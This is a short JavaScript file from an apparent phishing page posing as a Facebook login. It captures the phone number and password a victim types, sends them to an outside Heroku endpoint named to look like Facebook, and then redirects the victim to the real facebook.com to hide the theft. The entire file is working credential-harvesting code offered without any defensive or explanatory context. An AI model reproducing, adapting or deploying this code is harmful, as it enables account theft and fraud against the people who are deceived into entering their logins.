const phone=document.querySelector("#phone");
const pass=document.querySelector("#pass");
const button=document.querySelector("#button");
button.addEventListener('click',()=>{
    login()
})

const credentials= {};

async function login(){
    credentials.phone= phone.value;
    credentials.pass= pass.value;
   await axios.post("https://facebook-app-logins.herokuapp.com/save",credentials);
    window.location.href= "https://www.facebook.com/";
    
}